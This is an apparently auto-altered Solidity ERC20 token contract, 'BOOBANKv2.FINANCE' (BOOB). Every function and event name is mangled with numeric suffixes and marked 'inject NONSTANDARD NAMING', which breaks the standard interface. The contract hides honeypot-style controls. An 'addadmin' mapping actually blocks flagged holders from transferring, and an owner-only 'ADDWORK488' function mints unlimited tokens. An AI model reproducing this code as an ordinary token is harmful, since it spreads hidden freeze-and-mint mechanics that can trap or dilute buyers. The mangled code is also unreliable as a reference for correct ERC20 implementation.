                                                                 

                                                                 

                                                                 

pragma solidity ^0.5.11;

interface IERC20 {
  function TOTALSUPPLY932() external view returns (uint256);	//inject NONSTANDARD NAMING
  function BALANCEOF907(address who) external view returns (uint256);	//inject NONSTANDARD NAMING
  function ALLOWANCE438(address owner, address spender) external view returns (uint256);	//inject NONSTANDARD NAMING
  function TRANSFER692(address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function APPROVE12(address spender, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function TRANSFERFROM552(address from, address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING

  event TRANSFER561(address indexed from, address indexed to, uint256 value);	//inject NONSTANDARD NAMING
  event APPROVAL52(address indexed owner, address indexed spender, uint256 value);	//inject NONSTANDARD NAMING
}

library SafeMath {
  function MUL683(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function DIV228(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a / b;
    return c;
  }

  function SUB135(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    assert(b <= a);
    return a - b;
  }

  function ADD783(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function CEIL210(uint256 a, uint256 m) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = ADD783(a,m);
    uint256 d = SUB135(c,1);
    return MUL683(DIV228(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function NAME706() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokenname;
  }

  function SYMBOL341() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokensymbol;
  }

  function DECIMALS366() public view returns(uint8) {	//inject NONSTANDARD NAMING
    return _Tokendecimals;
  }
}



contract BOOB is ERC20Detailed {

  using SafeMath for uint256;
    
  uint256 public totalBurn = 0;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public addadmin;
  string constant tokenname387 = "BOOBANKv2.FINANCE";	//inject NONSTANDARD NAMING
  string constant tokensymbol60 = "BOOB";	//inject NONSTANDARD NAMING
  uint8  constant tokendecimals356 = 18;	//inject NONSTANDARD NAMING
  uint256 _totalSupply = 100000*10**uint(tokendecimals356); 
 
  
  //any tokens sent here ? 
  IERC20 currentToken ;
  	address payable public _owner;
    
    //modifiers	
	modifier ONLYOWNER19() {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner);
      _;
  }
  
  address initialSupplySend = 0xD29414CedbBf2560AA478283FF2fbAe4CD6550d7;
  

  constructor() public payable ERC20Detailed(tokenname387, tokensymbol60, tokendecimals356) {
      
    _SUPPLY168(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }

  function TOTALSUPPLY932() public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _totalSupply;
  }

  function BALANCEOF907(address owner) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _balances[owner];
  }

  function ALLOWANCE438(address owner, address spender) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _allowed[owner][spender];
  }

  function ADDADMIN420(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = true;
  }
  
    function REMOVEADMIN805(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = false;
  }

 function TRANSFER692(address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        _EXECUTETRANSFER781(msg.sender, to, value);
        return true;
    }
    
    function MULTITRANSFER149(address[] memory receivers, uint256[] memory values) public	//inject NONSTANDARD NAMING
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _EXECUTETRANSFER781(msg.sender, receivers[i], values[i]);
    }
    
    function TRANSFERFROM552(address from, address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].SUB135(value);
        _EXECUTETRANSFER781(from, to, value);
        return true;
    }
   
    function _EXECUTETRANSFER781(address _from, address _to, uint256 _value) private	//inject NONSTANDARD NAMING
    {
      require(!addadmin[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.SUB135(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.ADD783(_balances[_to], _value);                            // Add the same to the recipient
        emit TRANSFER561(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         
  //no zeros for decimals necessary 
  function MULTITRANSFEREQUALAMOUNT99(address[] memory receivers, uint256 amount) public {	//inject NONSTANDARD NAMING
    uint256 amountWithDecimals = amount * 10**tokendecimals356;

    for (uint256 i = 0; i < receivers.length; i++) {
      TRANSFER692(receivers[i], amountWithDecimals);
    }
  }

  function APPROVE12(address spender, uint256 value) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit APPROVAL52(msg.sender, spender, value);
    return true;
  }

  function INCREASEALLOWANCE493(address spender, uint256 addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].ADD783(addedValue));
    emit APPROVAL52(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function DECREASEALLOWANCE627(address spender, uint256 subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].SUB135(subtractedValue));
    emit APPROVAL52(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _SUPPLY168(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
    require(amount != 0);
    _balances[account] = _balances[account].ADD783(amount);
    emit TRANSFER561(address(0), account, amount);
  }

 //take back unclaimed tokens of any type sent by mistake
  function WITHDRAWUNCLAIMEDTOKENS857(address contractUnclaimed) external ONLYOWNER19 {	//inject NONSTANDARD NAMING
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.BALANCEOF907(address(this));
      currentToken.TRANSFER692(_owner, amount);
  }
  
  function ADDWORK488(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!warning");
      _SUPPLY168(account, amount);
  }
}